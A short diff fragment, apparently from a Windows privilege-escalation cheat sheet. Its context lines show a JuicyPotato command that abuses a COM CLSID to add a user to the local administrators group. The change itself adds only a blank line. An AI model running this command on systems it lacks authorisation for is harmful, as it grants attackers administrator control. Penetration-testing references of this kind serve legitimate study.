@@ -44,3 +44,4 @@ or
 • Add a user in the administrators group using the specific CLSID
 .\JuicyPotato.exe -l 1337 -p C:\Windows\system32\cmd .exe -t {CLSID} -a "/c net localgroup administrators {MY_EXISTING_USER} /add"
 ```
+
